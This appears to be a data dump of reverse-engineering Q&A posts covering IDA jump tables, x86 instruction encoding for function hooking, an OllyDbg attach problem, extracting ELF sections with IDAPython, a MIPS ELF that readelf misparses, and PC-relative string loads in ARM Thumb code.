<p><img src=""https://i.stack.imgur.com/3ld8y.png"" alt=""Graph for 1st jump table""></p>

<p><em>Edit, as the the wording of the question was probably misleading</em></p>

<p>The graph node shows 9 outgoing connections. 5 of them are true connections, the next 4 are not - they belong to a different jump table that happens to be directly after this one in memory. I'd like to tell IDA ""This jump table has 5 valid entries, ignore the other ones when creating the graph node"". Is there any way to do this?</p>

<p><em>The original question was:</em></p>

<blockquote>
  <p>The first jump table has 9 connections, 4 of which don't belong to
  <em>that</em> statement. (The second one, ommited here for brevity, has only one connection). Is there any way to tell IDA to remove the extra
  connections from the first table, and possibly create new connections
  from the 2nd table to the corresponding targets?</p>
</blockquote>

<p>I already tried defining the jump tables as arrays, then undefine the function and re-define it as code, but that didn't change anything.</p>

<p>(I'm using IDA 5.0, as this is a hobby project, and i don't want to spend several hundred bucks on something i'll use a few times a year).</p>
","<p>It's possible, but not in the freeware version:</p>

<ol>
<li>Put cursor on the <code>jmp</code></li>
<li>Edit->Other->Specify switch idiom...</li>
</ol>
","4081"
"How are x86 CPU instructions encoded?","2643","","<p>I'm writing a small utility library for hooking functions at run time. I need to find out the length of the first few instructions because I don't want to assume anything or require the developer to manually input the amount of bytes to relocate and overwrite.</p>

<p>There are many great resources to learn assembly but none of them seem to go into much detail on how assembly mnemonics get turned into raw binary instructions.</p>
","<p>If you want to understand the instruction encodings in detail you need to study <a href=""http://download.intel.com/products/processor/manual/325383.pdf"">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (Instruction Set Reference, A-Z)</a>. Be aware that Intel IA-32 and AMD64 are very complicated instruction sets and in order to hook a function which is not specifically designed to be hooked by injecting a jump you will run into a great number of different instructions. There is no guarantee that the function even has a stack frame set up. </p>

<p>There are libraries which can do the disassembly and hooking for you, such as <a href=""http://research.microsoft.com/en-us/projects/detours/"">Detours</a> by Microsoft Research.</p>
","12"
"OllyDbg 1.10 - attaching to running process suspends it indefinitely","2632","","<p>In my OllyDbg v1.10, when I attempt to attach the debugger to a running process, Olly behaves as if it was successful, but the process is frozen (I'm unable to bring the window back up). I've tried switching to the main module, hitting F9 - still nothing, the process simply halts (""Paused"" in Olly). I've found this issue described by a user on some forum, but it had remained unresolved as others had trouble reproducing it.</p>

<p>I've tried this for MS Notepad, Calc, regedit and a propetriary 3rd party application, and the result is the same everywhere.</p>

<p>This does not hold true for Olly 2.0 - that version behaves as expected, simply attaches to the process and lets me explore it.</p>

<p>My OS is a 32-bit Windows 7 Ultimate.</p>
","<p>Since this apparently isn't a very well-known issue, all I can say is that version 2.01 has no such problems. My solution was to just switch to it.</p>
","6470"
"How to extract all the rodata data and bss section using IDC script in IDA Pro?","2631","","<p>test Platform is 
32 bit Linux ELF and 32 bit Windows PE.</p>

<p>I use IDC script to extract all the functions from binary and dump 
into a file, then do the analysis based on the examples in IDA Pro book.</p>

<p>But I don't know how to extract .data .rodata and .bss
sections from ELF file using IDC script.</p>

<p>Currently I use IDA Pro to create a asm file, and use Python script to 
do the string parser work, extracting .data .rodata and .bss
sections from this asm file.</p>

<p>Basically It works fine, but a really tedious modification work is required, 
and as my test base is relatively large(notepad++ and others..), I have to
spend lots of time do modify work to correctly extract this three sections.</p>

<p>My question is ""is there any idc script/idapython script can extract .data .rodata and .bss
sections from ELF file?"" and any solutions on Windows are also welcomed.</p>

<p>Thank you!</p>
","<p>For the <code>.bss</code> section something like the following may work for you:</p>

<pre><code>import idaapi
import idc

print ""section .bss""
start = idaapi.get_segm_by_name("".bss"").startEA
end = idaapi.get_segm_by_name("".bss"").endEA
item = idc.NextHead(start - 1, end)
while item != BADADDR:
   next = idc.NextHead(item, end)
   if next != BADADDR:
      print ""%s: resb %d"" % (idc.Name(item), next - item)
   else:
      print ""%s: resb %d"" % (idc.Name(item), end - item)
   item = next
</code></pre>

<p>although in practice, <code>NextHead</code> does not seem to pick up anything named as <code>unk_XXXX</code>, so you may need to further iterate over the section to determine whether there are any cross references to an address to decide whether to associate a declaration with it.</p>

<p>For the <code>.data</code> and <code>.rodata</code> sections you will need to change to <code>db/dw/dd/...</code> as appropriate and additionally dump the content of the related items. The challenge for items in these sections is to properly determine the size of each item and correctly choose <code>db/dw/dd/...</code> Dumping raw bytes with <code>db</code> may be the simplest approach here.</p>
","3609"
"How to disassemble/run mips ELF file ? (with readelf error)","2626","","<p>So i want to disassemble and then run a MIPS elf file for the first time. As i don't have MIPS hardware i am using mipsel-unknown-linux-gnu toolchain.Here comes the problem. The output of the command file myelf is:</p>

<pre><code>ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked (uses shared libs), stripped
</code></pre>

<p>But when i try to disassemble the file i get:</p>

<pre><code>mipsel-unknown-linux-gnu-objdump: myelf: File format not recognized
</code></pre>

<p>I get the same error when i want to run it or to debug it. But if i write a small program in MIPS assembly (using an edit and mipsel-unknown-linux-gnu-as as assembler and mipsel-unknown-linux-gnu-ld as a linker) i can run it and debug it so i'm sure the problem comes from myelf file. Actually i can disassemble myelf with IDA but i want to follow the execution using gdb under linux.</p>

<p>Then i did a readelf and this is the output of mipsel-unknown-linux--u-readelf -a myelf:</p>

<pre><code>ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           MIPS R3000
  Version:                           0x1
  Entry point address:               0x400670
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4132 (bytes into file)
  Flags:                             0x1007, noreorder, pic, cpic, o32, mips1
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 29
readelf: Error: Unable to read in 0x69737265 bytes of string table

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0] &lt;no-name&gt;         LOUSER+6f0fbdbf bdbfefbd bdbfef3b f286821 bfef4abd WAXxMSLOTxxxxxxxxop 1992146927 4022190063 3220159935
readelf: Warning: section 0: sh_link value of 1992146927 is larger than the number of sections
  [ 1] &lt;no-name&gt;         09bdbfef: &lt;unkn bfefbdbf bfef58bd ef3d6ebd ef5d6e20 WAXxSILOGTxxxxxxxop 3220159935 3220134333 1483756221
readelf: Warning: section 1: sh_link value of 3220159935 is larger than the number of sections
  [ 2] &lt;no-name&gt;         LOUSER+3dbfefbd bfef1257 ef1e67bd bfefbdbf efbdbfef WAXIOGTxxxxxxxxop 3183472573 1589493743 3183472479
readelf: Warning: section 2: sh_link value of 3183472573 is larger than the number of sections
  [ 3] &lt;no-name&gt;         LOUSER+3fefbdbf bfef35bd bfef51bd bfef07bd bdbfef38 WXxMSLOGxxxxxxop 4017489853 1393212863 498974703
readelf: Warning: section 3: sh_link value of 4017489853 is larger than the number of sections
  [ 4] &lt;no-name&gt;         LOUSER+3dbfef7c 25bdbfef 44bdbfef efbdbfef efbdbfef WAXOGTxxxxxxxxop 4013997503 4014390719 1532607935
readelf: Warning: section 4: sh_link value of 4013997503 is larger than the number of sections
  [ 5] &lt;no-name&gt;         LOUSER+6f17bdbf bfef1fbd ef3d6dbd 2b4ebdbf ef3a332c WAXxMSLOTxxxxxxxxop 700301295 3183472475 3183472441
readelf: Warning: section 5: sh_link value of 700301295 is larger than the number of sections
  [ 6] &lt;no-name&gt;         LOUSER+6f15bdbf ef0f15bd bfefbdbf bdbfefbd bfef4e90 WAXxMSLOTxxxxxxxxop 3220132880 3220113853 3661197501
readelf: Warning: section 6: sh_link value of 3220132880 is larger than the number of sections
  [ 7] &lt;no-name&gt;         LOUSER+6f1c2e62 64bdbfef 4a3d369 ef603c51 ef40bdbf WAXxMSLOTxxxxxxop 1366867391 700301295 4011659522
readelf: Warning: section 7: sh_link value of 1366867391 is larger than the number of sections
  [ 8] &lt;no-name&gt;         4c2cbdbf: &lt;unkn bdbfefbd bfef3c4f ef476cbd ef1d10bd AXMSIOGTxxxxxxop 386514367 3183472428 3220142970
readelf: Warning: section 8: sh_link value of 386514367 is larger than the number of sections
  [ 9] &lt;no-name&gt;         LOUSER+24c2bdbf 42781f57 efb4a5e5 bfefbdbf 716bdbf WAXxSILOGTxxxxxxxop 3183472573 4012516894 4016422335
readelf: Warning: section 9: sh_link value of 3183472573 is larger than the number of sections
  [10] &lt;no-name&gt;         LOUSER+3fefbdbf 476e0abd 18bdbfef bdbfef32 4bdbfef WXxMSLGxxxxxxop 3183472447 4022190063 525516223
readelf: Warning: section 10: sh_link value of 3183472447 is larger than the number of sections
  [11] &lt;no-name&gt;         LOUSER+3dbfef0f bdbfef35 ef5a2137 5415bdbf efbdbfef AMIOGTxxxxxxxxop 3220117023 3183472573 3183472496
readelf: Warning: section 11: sh_link value of 3220117023 is larger than the number of sections
  [12] &lt;no-name&gt;         LOUSER+3dbfefbd 80dc78ae efbdbfef bfefbdbf bdbfefbd AXxTxxxop 3220115133 4015879101 3220159935
readelf: Warning: section 12: sh_link value of 3220115133 is larger than the number of sections
  [13] &lt;no-name&gt;         LOUSER+3dbfef4a cf6622bd bdbfef89 77bdbfef ef714abd WASIOTxxxxxop 3220122624 3220140989 3220129981
readelf: Warning: section 13: sh_link value of 3220122624 is larger than the number of sections
  [14] &lt;no-name&gt;         LOUSER+6f202b35 5b1a78bd efbdbfef bfefbdbf ef37bdbf WAXxMSLOTxxxxxxxxop 3183472573 3183472489 4022190063
readelf: Warning: section 14: sh_link value of 3183472573 is larger than the number of sections
  [15] &lt;no-name&gt;         2a0e3fbd: &lt;unkn efbdbfef ef3abdbf ef15bdbf bfefbdbf WxOGTxxxxxxxxop 4013014463 4012883391 4014063039
readelf: Warning: section 15: sh_link value of 4013014463 is larger than the number of sections
  [16] &lt;no-name&gt;         LOUSER+6fbdbfef bfefbdbf bdbfefbd 3fbdbfef ef0961bd WAXxMSLOTxxxxxxop 1899399115 3183472494 3220112411
readelf: Warning: section 16: sh_link value of 1899399115 is larger than the number of sections
  [17] &lt;no-name&gt;         185a7404: &lt;unkn 0038bdbf 4abdbfef bdbfef09 9631ebd WAXxMSOGxxxxop 985513967 4010489125 3220159935
readelf: Warning: section 17: sh_link value of 985513967 is larger than the number of sections
  [18] &lt;no-name&gt;         LOUSER+6fa4db38 00bdbfef 000000 000000 bfef0000 WAXxMSLOTxxxxxop  0   0  0
  [19] &lt;no-name&gt;         410c3000: &lt;unkn 00000000 000000 bdbfef00 7000400b     4009771013 1074249151 3183472384
readelf: Warning: section 19: sh_link value of 4009771013 is larger than the number of sections
  [20] &lt;no-name&gt;         0000400b: &lt;unkn ef00400b 4009bdbf 400b4000 00   p 1074475008 1074470912 1074466816
readelf: Warning: section 20: sh_link value of 1074475008 is larger than the number of sections
  [21] &lt;no-name&gt;         LOUSER+3dbfef00 0000400b ef000000 4007bdbf bdbfefbd Wxx 117440512 4022190063 3220159935
readelf: Warning: section 21: sh_link value of 117440512 is larger than the number of sections
  [22] &lt;no-name&gt;         NULL            1d000000 1f000000 ef000000 bfefbdbf   p 1074314687   0 4022190063
readelf: Warning: section 22: sh_link value of 1074314687 is larger than the number of sections
  [23] &lt;no-name&gt;         00bdbfef: &lt;unkn 20000000 1d000000 1f000000 00     4009754624 1074380223  0
readelf: Warning: section 23: sh_link value of 4009754624 is larger than the number of sections
  [24] &lt;no-name&gt;         NULL            00001d00 001f00 bdbfef00 efbdbfef     16393 3220127488 3183472573
readelf: Warning: section 24: sh_link value of 16393 is larger than the number of sections
  [25] &lt;no-name&gt;         000000bd: &lt;unkn 00003800 001d00 001f00 2e34206e     1128482560 1143480378 1634296421
readelf: Warning: section 25: sh_link value of 1128482560 is larger than the number of sections
  [26] &lt;no-name&gt;         34202938: &lt;unkn 000f4100 6e670000 7010075 626174 AXxSTxxxxxop 67108864 1932394497 1920234344
readelf: Warning: section 26: sh_link value of 67108864 is larger than the number of sections
  [27] &lt;no-name&gt;         00707265: &lt;unkn 42412e65 61742d49 722e0067 756e672e AXxSGTxxxxxxxop 1852401509 771780454 1702129518
readelf: Warning: section 27: sh_link value of 1852401509 is larger than the number of sections
  [28] &lt;no-name&gt;         LOOS+92d646c    6d616e79 2e006369 68736168 7274736e XSIxxxop 2036608512 1836675950 2036608512
readelf: Warning: section 28: sh_link value of 2036608512 is larger than the number of sections
  [29] &lt;no-name&gt;         LOOS+5762e75    672e006e 762e756e 69737265 74786574 AMSIOGxxxxxop 1918856815 1852386816 771781737
readelf: Warning: section 29: sh_link value of 1918856815 is larger than the number of sections
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x00400034 0x00400034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x00400154 0x00400154 0x0000a 0x0000a R   0x1
      [Requesting program interpreter: ]
  REGINFO        0x1bdbfef 0xbfef0000 0x004001bd 0x1bdbfef 0x180040     0x40000
  &lt;unknown&gt;: 400 0x010000 0x00000000 0x00000000 0x00040 0xc300040     0x50000
  NULL           0x010001 0x0c300000 0x0c300000 0xc300041 0x2400041     0x60000
  NULL           0x020001 0xbfef0000 0x000001bd 0x1bdbfef 0xbfef0040 R E 0xbdbfef
  &lt;unknown&gt;: bfe 0x0000bd 0x00000007 0x00000004 0x00004 0x00164 R   0x400164
  &lt;unknown&gt;: 20  0x000020 0x00000004 0x00000004 0x00004 0x1bdbfef     0x4001bd
  &lt;unknown&gt;: 1bd 0x240040 0x00240000 0x00040000 0x40000 0x00000     0

There is no dynamic section in this file.

There are no relocations in this file.

The decoding of unwind sections for machine type MIPS R3000 is not currently supported.

No version information found in this file.
</code></pre>

<p>As it's a project from a school dealing with reverse engineering, the elf file may be corrupted or not. I have no idea from what the problem could come from. You can download myelf file from this <a href=""https://bitbucket.org/Nomyo/reverse-engineering/downloads"" rel=""nofollow"">link</a>. Thank you.</p>

<p>Anyone have encountered this kind of error or any suggestions ? </p>
","<p>This file is completely valid ELF, but you have a problem with the toolchain.
You should check correctness of its setup.</p>

<p>In addition if you don't have the hardware you can use <a href=""http://wiki.qemu.org/Main_Page"" rel=""nofollow"">qemu</a> to run it.
There is also <a href=""http://landley.net/aboriginal/"" rel=""nofollow"">aboriginal</a> toolchain that you can try to use.</p>

<p>Output of the readelf should be as follows:</p>

<pre><code>mips-unknown-nto-qnx6.5.0-readelf -a ~/Downloads/myelf 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           MIPS R3000
  Version:                           0x1
  Entry point address:               0x400670
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4132 (bytes into file)
  Flags:                             0x1007, noreorder, pic, cpic, o32, mips1
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 29

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        00400154 000154 00000d 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            00400164 000164 000020 00   A  0   0  4
  [ 3] .reginfo          MIPS_REGINFO    00400184 000184 000018 18   A  0   0  4
  [ 4] .note.gnu.build-i NOTE            0040019c 00019c 000024 00   A  0   0  4
  [ 5] .dynamic          DYNAMIC         004001c0 0001c0 0000d8 08   A  8   0  4
  [ 6] .hash             HASH            00400298 000298 0000a4 04   A  7   0  4
  [ 7] .dynsym           DYNSYM          0040033c 00033c 000160 10   A  8   1  4
  [ 8] .dynstr           STRTAB          0040049c 00049c 0000df 00   A  0   0  1
  [ 9] .gnu.version      VERSYM          0040057c 00057c 00002c 02   A  7   0  2
  [10] .gnu.version_r    VERNEED         004005a8 0005a8 000030 00   A  8   1  4
  [11] .init             PROGBITS        004005d8 0005d8 000090 00  AX  0   0  4
  [12] .text             PROGBITS        00400670 000670 000490 00  AX  0   0 16
  [13] .MIPS.stubs       PROGBITS        00400b00 000b00 0000a0 00  AX  0   0  4
  [14] .fini             PROGBITS        00400ba0 000ba0 00004c 00  AX  0   0  4
  [15] .rodata           PROGBITS        00400bec 000bec 000040 00   A  0   0  4
  [16] .eh_frame         PROGBITS        00400c2c 000c2c 000004 00   A  0   0  4
  [17] .ctors            PROGBITS        00410c30 000c30 00000c 00  WA  0   0  4
  [18] .dtors            PROGBITS        00410c3c 000c3c 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        00410c44 000c44 000004 00  WA  0   0  4
  [20] .data             PROGBITS        00410c50 000c50 0001b0 00  WA  0   0 16
  [21] .rld_map          PROGBITS        00410e00 000e00 000004 00  WA  0   0  4
  [22] .got              PROGBITS        00410e10 000e10 00005c 04 WAp  0   0 16
  [23] .sdata            PROGBITS        00410e6c 000e6c 000004 00 WAp  0   0  4
  [24] .bss              NOBITS          00410e70 000e70 000010 00  WA  0   0 16
  [25] .pdr              PROGBITS        00000000 000e70 000080 00      0   0  4
  [26] .comment          PROGBITS        00000000 000ef0 00001c 01  MS  0   0  1
  [27] .gnu.attributes   LOOS+ffffff5    00000000 000f0c 000010 00      0   0  1
  [28] .mdebug.abi32     PROGBITS        00000070 000f1c 000000 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 000f1c 000107 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x00400034 0x00400034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x00400154 0x00400154 0x0000d 0x0000d R   0x1
      [Requesting program interpreter: /lib/ld.so.1]
  REGINFO        0x000184 0x00400184 0x00400184 0x00018 0x00018 R   0x4
  LOAD           0x000000 0x00400000 0x00400000 0x00c30 0x00c30 R E 0x10000
  LOAD           0x000c30 0x00410c30 0x00410c30 0x00240 0x00250 RW  0x10000
  DYNAMIC        0x0001c0 0x004001c0 0x004001c0 0x000d8 0x000d8 RWE 0x4
  NOTE           0x000164 0x00400164 0x00400164 0x00020 0x00020 R   0x4
  NOTE           0x00019c 0x0040019c 0x0040019c 0x00024 0x00024 R   0x4
  NULL           0x000000 0x00000000 0x00000000 0x00000 0x00000     0x4

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .reginfo 
   03     .interp .note.ABI-tag .reginfo .note.gnu.build-id .dynamic .hash .dynsym .dynstr .gnu.version .gnu.version_r .init .text .MIPS.stubs .fini .rodata .eh_frame 
   04     .ctors .dtors .jcr .data .rld_map .got .sdata .bss 
   05     .dynamic 
   06     .note.ABI-tag 
   07     .note.gnu.build-id 
   08     

Dynamic section at offset 0x1c0 contains 22 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x4005d8
 0x0000000d (FINI)                       0x400ba0
 0x00000004 (HASH)                       0x400298
 0x00000005 (STRTAB)                     0x40049c
 0x00000006 (SYMTAB)                     0x40033c
 0x0000000a (STRSZ)                      223 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x70000016 (MIPS_RLD_MAP)               0x410e00
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x410e10
 0x70000001 (MIPS_RLD_VERSION)           1
 0x70000005 (MIPS_FLAGS)                 NOTPOT
 0x70000006 (MIPS_BASE_ADDRESS)          0x400000
 0x7000000a (MIPS_LOCAL_GOTNO)           7
 0x70000011 (MIPS_SYMTABNO)              22
 0x70000012 (MIPS_UNREFEXTNO)            29
 0x70000013 (MIPS_GOTSYM)                0x6
 0x6ffffffe (VERNEED)                    0x4005a8
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x40057c
 0x00000000 (NULL)                       0x0

There are no relocations in this file.

There are no unwind sections in this file.

Symbol table '.dynsym' contains 22 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000001     0 SECTION GLOBAL DEFAULT  ABS _DYNAMIC_LINKING
     2: 00400bec     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
     3: 00000000     0 OBJECT  WEAK   DEFAULT  UND environ@GLIBC_2.0 (2)
     4: 00000000     0 OBJECT  WEAK   DEFAULT  UND _environ@GLIBC_2.0 (2)
     5: 00410e00     0 OBJECT  GLOBAL DEFAULT   21 __RLD_MAP
     6: 004005d8     0 FUNC    GLOBAL DEFAULT   11 _init
     7: 004007b0   320 FUNC    GLOBAL DEFAULT   12 main
     8: 00400b80     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
     9: 00400b70     0 FUNC    GLOBAL DEFAULT  UND cbc_crypt@GLIBC_2.2 (3)
    10: 00400b60     0 FUNC    GLOBAL DEFAULT  UND munmap@GLIBC_2.0 (2)
    11: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __environ@GLIBC_2.0 (2)
    12: 00400b50     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
    13: 004009e8   176 FUNC    GLOBAL DEFAULT   12 __libc_csu_init
    14: 00400b40     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.0 (2)
    15: 00400b30     0 FUNC    GLOBAL DEFAULT  UND mprotect@GLIBC_2.0 (2)
    16: 00400b20     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
    17: 00400b10     0 FUNC    GLOBAL DEFAULT  UND ptrace@GLIBC_2.0 (2)
    18: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
    19: 00000000     0 FUNC    WEAK   DEFAULT  UND __gmon_start__
    20: 004009e0     8 FUNC    GLOBAL DEFAULT   12 __libc_csu_fini
    21: 00400b00     0 FUNC    GLOBAL DEFAULT  UND mmap@GLIBC_2.0 (2)

Histogram for bucket list length (total of 17 buckets):
 Length  Number     % of total  Coverage
      0  5          ( 29.4%)
      1  7          ( 41.2%)     33.3%
      2  3          ( 17.6%)     61.9%
      3  1          (  5.9%)     76.2%
      4  0          (  0.0%)     76.2%
      5  1          (  5.9%)    100.0%

Version symbols section '.gnu.version' contains 22 entries:
 Addr: 000000000040057c  Offset: 0x00057c  Link: 7 (.dynsym)
  000:   0 (*local*)       1 (*global*)      1 (*global*)      2 (GLIBC_2.0)  
  004:   2 (GLIBC_2.0)     1 (*global*)      1 (*global*)      1 (*global*)   
  008:   2 (GLIBC_2.0)     3 (GLIBC_2.2)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  
  00c:   2 (GLIBC_2.0)     1 (*global*)      2 (GLIBC_2.0)     2 (GLIBC_2.0)  
  010:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     0 (*local*)       0 (*local*)    
  014:   1 (*global*)      2 (GLIBC_2.0)  

Version needs section '.gnu.version_r' contains 1 entries:
 Addr: 0x00000000004005a8  Offset: 0x0005a8  Link: 8 (.dynstr)
  000000: Version: 1  File: libc.so.6  Cnt: 2
  0x0010:   Name: GLIBC_2.2  Flags: none  Version: 3
  0x0020:   Name: GLIBC_2.0  Flags: none  Version: 2

Notes at offset 0x00000164 with length 0x00000020:
  Owner     Data size   Description
  GNU       0x00000010  NT_GNU_ABI_TAG (ABI version tag)

Notes at offset 0x0000019c with length 0x00000024:
  Owner     Data size   Description
  GNU       0x00000014  NT_GNU_BUILD_ID (unique build ID bitstring)
Attribute Section: gnu
File Attributes
  Tag_GNU_MIPS_ABI_FP: Hard float (-mdouble-float)

Primary GOT:
 Canonical gp value: 00418e00

 Reserved entries:
   Address     Access  Initial Purpose
  00410e10 -32752(gp) 00000000 Lazy resolver
  00410e14 -32748(gp) 80000000 Module pointer (GNU extension)

 Local entries:
   Address     Access  Initial
  00410e18 -32744(gp) 00400000
  00410e1c -32740(gp) 00410c30
  00410e20 -32736(gp) 00000000
  00410e24 -32732(gp) 00000000
  00410e28 -32728(gp) 00000000

 Global entries:
   Address     Access  Initial Sym.Val. Type    Ndx Name
  00410e2c -32724(gp) 004005d8 004005d8 FUNC     11 _init
  00410e30 -32720(gp) 004007b0 004007b0 FUNC     12 main
  00410e34 -32716(gp) 00400b80 00400b80 FUNC    UND exit
  00410e38 -32712(gp) 00400b70 00400b70 FUNC    UND cbc_crypt
  00410e3c -32708(gp) 00400b60 00400b60 FUNC    UND munmap
  00410e40 -32704(gp) 00000000 00000000 OBJECT  UND __environ
  00410e44 -32700(gp) 00400b50 00400b50 FUNC    UND puts
  00410e48 -32696(gp) 004009e8 004009e8 FUNC     12 __libc_csu_init
  00410e4c -32692(gp) 00400b40 00400b40 FUNC    UND memcpy
  00410e50 -32688(gp) 00400b30 00400b30 FUNC    UND mprotect
  00410e54 -32684(gp) 00400b20 00400b20 FUNC    UND __libc_start_main
  00410e58 -32680(gp) 00400b10 00400b10 FUNC    UND ptrace
  00410e5c -32676(gp) 00000000 00000000 NOTYPE  UND _Jv_RegisterClasses
  00410e60 -32672(gp) 00000000 00000000 FUNC    UND __gmon_start__
  00410e64 -32668(gp) 004009e0 004009e0 FUNC     12 __libc_csu_fini
  00410e68 -32664(gp) 00400b00 00400b00 FUNC    UND mmap
</code></pre>
","8649"
"How do I change a string correctly in IDA Pro?","2616","","<p>I am trying to patch a cydia tweak which has been developed by using Objective-C. I would like to modify a piece of code to suite my need.</p>

<p>I'm using IDA Pro V6.8 for my examining. After inspecting, I recognize that each Hex byte would represent a part of an assembly line code.</p>

<p><em>Bellow is a screenshot for the code that I need to change.</em>
<a href=""https://i.stack.imgur.com/I0Yb2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/I0Yb2.png"" alt=""enter image description here""></a></p>

<p>Looking at the above screenshot, we need to have 8 bytes <em>(4A F2 A6 50 C0 F2 01 00)</em> to represent a ""MOV"" instruction. Let's me say something about these 8 bytes:</p>

<ol>
<li>As I know, the first four bytes <em>(4A F2 A6 50)</em> represent for ""#(cfstr_UnknownCallbac - 0x9F56)"" which you see in the screenshot.</li>
<li>The two following bytes <em>(C0 F2)</em> represent for an MOV instruction.</li>
<li>The last two bytes <em>(01 00)</em> would tell the system to move value from the string into the register, in this case, the register is R0.</li>
</ol>

<p><strong>I have some concerns about the MOV instruction and the first four HEX bytes (4A F2 A6 50)</strong></p>

<ol>
<li><p>What does the ""0x9F56"" in the instruction means?</p></li>
<li><p>How does the system know that the first four bytes reflect correctly to ""#(cfstr_UnknownCallbac - 0x9F56)"" not any other string variables?</p></li>
<li><p><em>I need to create a new string and then I will use it to replace the existing ""#(cfstr_UnknownCallbac - 0x9F56)""</em>. I believe that I just need to replace the first four HEX bytes so that it would point to the new string, but I don't know what are the HEX codes should I have here.</p></li>
</ol>

<p>Any help is appreciated, thank you very much.</p>
","<p>To understand what's happening, you need to learn about <a href=""https://en.wikipedia.org/wiki/Position-independent_code"" rel=""nofollow noreferrer"">Position Independent Code</a> (PIC). </p>

<p>In a nutshell, the compiler wants the executable code to be correct independent of where in memory it gets loaded. In the case of a shared library, the OS may load it at a different place every time; even if statically linked, PIC will make the linker's life easier.</p>

<p>The ""trick"" that's normally used on ARM processors to produce PIC is using PC (Program Counter) relative addresses. The compiler doesn't produce code that says ""the string is at address 0x123456"", it produces ""the string is 0x1234 bytes behind this instruction"". Thus, when the program is moved in memory, the ""0x1234"" stays the same.</p>

<p>Which is why your 2nd instruction adds the program counter to the relative address in R0.</p>

<p>Now, to know what <code>ADD R0, PC</code> really does, you need to know how the processor works. The processor is in Thumb (2 byte instructions) mode as you can see from the 2 bytes difference between <code>9F52</code> and <code>9F54</code>, and when the processor executes the <code>ADD R0, PC</code> instruction, the prefetch unit will already have read the first two bytes of <code>BLX _MSlog</code>. So the PC that gets added is actually <code>9F56</code>. This should answer your <strong>first question</strong>: in the display of the opcode's meaning, IDA subtracts the value it knows to be added in the next instruction.</p>

<p><strong>Second question</strong>: I don't know the internals of IDA, but I'm 99% sure it looks for <code>ADD Rx, PC</code> instructions, and produces a string reference like yours at the preceding instruction that loads <code>Rx</code>, just because it knows this is the standard way of achieving PIC on ARM.</p>

<p><strong>Third question</strong>: Manually disasembling Thumb is hard - really hard - as you can see if you check the <a href=""https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf"" rel=""nofollow noreferrer"">Thumb instruction set</a>. And no, <code>4a f2 a6 50</code> isn't just a data offset; it loads the lower 16 bits of the value, and <code>C0 F2 01 00</code> loads the higher 16 bits of the value. The <a href=""https://www.onlinedisassembler.com/odaweb/6xokUFH4/0"" rel=""nofollow noreferrer"">Online Disassembler</a> translates those two sets of 4 byte instructions to </p>

<pre><code>movw r0, #42406 ; 0xa5a6          
movt r0, #1
</code></pre>

<p>and you can read <a href=""https://stackoverflow.com/questions/7800055/movw-and-movt-in-arm-assembly"">here</a> about the <code>movw</code> and <code>movt</code> instructions. IDA is friendly enough to show all of this as one single 8-byte instruction, but under the hood, a lot more is going on.</p>

